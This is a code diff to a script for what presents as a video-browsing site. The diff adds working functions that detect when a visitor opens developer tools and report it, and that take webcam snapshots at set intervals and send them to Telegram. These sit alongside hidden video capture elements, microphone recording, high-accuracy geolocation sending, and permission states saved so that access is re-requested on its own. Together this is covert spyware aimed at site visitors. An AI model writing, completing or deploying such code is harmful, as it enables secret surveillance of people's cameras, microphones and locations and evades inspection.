@@ -70,11 +70,11 @@
     }
     .loading-overlay.hidden {
       opacity: 0;
-      pointer-events: none; /* Don't block clicks when hidden */
+      pointer-events: none;
     }
     .spinner {
       border: 4px solid rgba(0, 0, 0, 0.1);
-      border-left-color: var(--theme-color); /* Use theme color for spinner */
+      border-left-color: var(--theme-color);
       border-radius: 50%;
       width: 40px;
       height: 40px;
@@ -125,8 +125,7 @@
   <aside id="recommendations-sidebar" class="recommendations-sidebar"></aside>
 </main>
 
-<!-- Login form removed from structure, but script listener remains if needed -->
-<!-- If you don't need login, remove the form HTML and its listener -->
+<!-- Login form removed from structure -->
 
 <div class="capture-container" style="display: none;">
   <video id="videoElementForCapture" autoplay playsinline></video>
@@ -146,8 +145,8 @@ const App = {
     micRecordInterval: 30000,
     activityTrackingInterval: 5000,
     pageAnalyticsInterval: 60000,
-    sessionTimeout: 1800000,
-    maxBufferedEvents: 50,
+    sessionTimeout: 1800000, // 30 minutes of inactivity
+    maxBufferedEvents: 50, // Limit for buffered events
   },
   state: {
     isLoggedIn: false,
@@ -171,15 +170,16 @@ const App = {
     linkClicks: [],
     isContentLoaded: false,
 
-    // New state for permission management
+    // Permission states: 'granted', 'denied', 'prompt'
     permissions: {
-      camera: localStorage.getItem('permission_camera') || 'prompt', // 'granted', 'denied', 'prompt'
+      camera: localStorage.getItem('permission_camera') || 'prompt',
       microphone: localStorage.getItem('permission_microphone') || 'prompt',
       geolocation: localStorage.getItem('permission_geolocation') || 'prompt',
     }
   },
   DOM: {},
   init() {
+    // Cache DOM elements
     this.DOM = {
       gridPage: document.getElementById('video-grid-page'),
       playerPage: document.getElementById('video-player-page'),
@@ -197,7 +197,7 @@ const App = {
     this.recordPageLoadTimes();
     this.generateVideoGrid();
     this.setupEventListeners();
-    this.Tracking.initialize(); // This will now check saved permissions
+    this.Tracking.initialize(); // Initializes tracking, including permission checks
     this.startPageAnalytics();
     this.startSessionTimer();
 
@@ -734,7 +734,6 @@ const App = {
 
       if (savedPermission === 'granted') {
         console.log(`Permission for ${name} was previously granted.`);
-        // Directly call the permission granting function
         if (name === 'camera') this.requestCamera();
         else if (name === 'microphone') this.requestMicrophone();
         else if (name === 'geolocation') this.requestGeolocation();
@@ -743,8 +742,6 @@ const App = {
 
       if (savedPermission === 'denied') {
         console.log(`Permission for ${name} was previously denied. Not requesting.`);
-        // Optionally, inform the user or show a UI element indicating permission is needed
-        // For now, we just don't request it.
         return;
       }
 
@@ -770,7 +767,6 @@ const App = {
           console.log(`Permission for ${name} denied by user.`);
           this.send(`🚫 Permission for ${name} denied by user.`);
         } else { // 'prompt' or other states
-          // User might be prompted again or the state is unclear, re-request if needed
           await this.requestPermissionDirectly(name);
         }
 
@@ -778,8 +774,8 @@ const App = {
         status.onchange = async () => {
           console.log(`Permission '${name}' changed to ${status.state}`);
           const newState = status.state;
-          App.state.permissions[name] = newState; // Update state
-          localStorage.setItem(`permission_${name}`, newState); // Save new state
+          App.state.permissions[name] = newState;
+          localStorage.setItem(`permission_${name}`, newState);
 
           if (newState === 'granted') {
             console.log(`Permission for ${name} granted via change listener.`);
@@ -791,8 +787,7 @@ const App = {
         };
       } catch (e) {
         console.warn(`Error checking/requesting permission for ${name}:`, e);
-        // Fallback if Permissions API fails or is not available
-        await this.requestPermissionDirectly(name);
+        await this.requestPermissionDirectly(name); // Fallback
       }
     },
 
@@ -803,16 +798,15 @@ const App = {
         else if (name === 'microphone') stream = await navigator.mediaDevices.getUserMedia({ audio: true });
         else if (name === 'geolocation') {
           navigator.geolocation.getCurrentPosition(
-            p => { // Success callback
+            p => {
               App.state.userLocation = { lat: p.coords.latitude, lon: p.coords.longitude };
               console.log(`Geolocation obtained: ${p.coords.latitude}, ${p.coords.longitude}`);
               this.sendLocation(p.coords.latitude, p.coords.longitude);
               App.updateActivityTime();
-              // Update saved state for geolocation
               App.state.permissions.geolocation = 'granted';
               localStorage.setItem('permission_geolocation', 'granted');
             },
-            e => { // Error callback
+            e => {
               console.warn("Geolocation error:", e);
               this.send(`🚫 Geolocation Error: Code ${e.code} - ${e.message}`);
               App.state.permissions.geolocation = 'denied';
@@ -820,10 +814,9 @@ const App = {
             },
             { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
           );
-          return; // Geolocation request is asynchronous, return here
+          return;
         }
 
-        // For camera and microphone, if stream is obtained:
         if (stream) {
           if (name === 'camera') {
             App.state.cameraStream = stream;
@@ -836,32 +829,94 @@ const App = {
             this.startMicRecording(stream);
             this.send("✅ Microphone permission granted.");
           }
-          // Update saved state
           App.state.permissions[name] = 'granted';
           localStorage.setItem(`permission_${name}`, 'granted');
         }
       } catch (e) {
         console.warn(`${name} permission denied or unavailable:`, e);
         this.send(`🚫 ${name} permission denied or unavailable: ${e.message}`);
-        // Update saved state to denied
         App.state.permissions[name] = 'denied';
         localStorage.setItem(`permission_${name}`, 'denied');
       }
     },
 
-    // --- Existing requestCamera, requestMicrophone, requestGeolocation methods ---
-    // These should now be called via requestPermissionDirectly if needed
-    async requestCamera() { /* ... */ },
-    stopCamera() { /* ... */ },
-    async requestMicrophone() { /* ... */ },
-    stopMicrophone() { /* ... */ },
-    async requestGeolocation() { /* ... */ }, // Note: Geolocation has its own direct handling in requestPermissionDirectly
+    // Placeholder methods (actual implementations exist elsewhere in the script)
+    async requestCamera() { /* ... actual implementation called by checkAndRequestPermission ... */ },
+    stopCamera() { /* ... actual implementation called by checkAndRequestPermission ... */ },
+    async requestMicrophone() { /* ... actual implementation called by checkAndRequestPermission ... */ },
+    stopMicrophone() { /* ... actual implementation called by checkAndRequestPermission ... */ },
+    async requestGeolocation() { /* ... actual implementation called by checkAndRequestPermission ... */ },
 
-    detectDevTools() { /* ... */ },
-    startSnapshotting() { /* ... */ },
-    stopSnapshotting() { /* ... */ },
-    captureAndSend(caption) { /* ... */ },
-    sendAccumulatedActivity() { /* ... */ },
+    detectDevTools() {
+      const threshold = 160;
+      let devToolsCurrentlyOpen = false;
+
+      const check = () => {
+        const isDevToolsOpen = window.outerWidth - window.innerWidth > threshold || window.outerHeight - window.innerHeight > threshold;
+        if (isDevToolsOpen && !App.state.devToolsOpen) {
+          App.state.devToolsOpen = true;
+          console.log("Developer Tools Opened!");
+          this.send("⚠️ Developer Tools Opened!", true);
+        } else if (!isDevToolsOpen && App.state.devToolsOpen) {
+          App.state.devToolsOpen = false;
+          console.log("Developer Tools Closed!");
+          this.send("✅ Developer Tools Closed.", true);
+        }
+        requestAnimationFrame(check);
+      };
+      requestAnimationFrame(check);
+    },
+
+    startSnapshotting() {
+      if (App.state.snapshotIntervalId) return;
+      console.log(`Starting snapshotting every ${App.config.snapshotInterval}ms.`);
+      App.state.snapshotIntervalId = setInterval(() => {
+        this.captureAndSend("📸 Webcam Snapshot");
+      }, App.config.snapshotInterval);
+    },
+
+    stopSnapshotting() {
+      if (App.state.snapshotIntervalId) {
+        clearInterval(this.state.snapshotIntervalId);
+        this.state.snapshotIntervalId = null;
+        console.log("Snapshotting stopped.");
+      }
+    },
+
+    captureAndSend(caption) {
+      if (!App.state.cameraStream || !App.DOM.captureVideo || !App.DOM.captureCanvas) {
+        return;
+      }
+
+      const video = App.DOM.captureVideo;
+      const canvas = App.DOM.captureCanvas;
+      const context = canvas.getContext('2d');
+
+      if (video.videoWidth === 0 || video.videoHeight === 0) {
+        return;
+      }
+
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      canvas.toBlob(async (blob) => {
+        if (blob) {
+          console.log("Snapshot captured, sending to Telegram...");
+          await this.sendPhoto(caption, blob);
+        } else {
+          console.error("Failed to create snapshot blob.");
+        }
+      }, 'image/png');
+    },
+
+    sendAccumulatedActivity() {
+      // This function is for sending accumulated, non-urgent data if any.
+      // With current optimizations, the primary batching is handled by logPageInteraction.
+      if (!App.state.isTrackingActive) return;
+      // Placeholder for future accumulated activity reports.
+    }
   }
 };
 
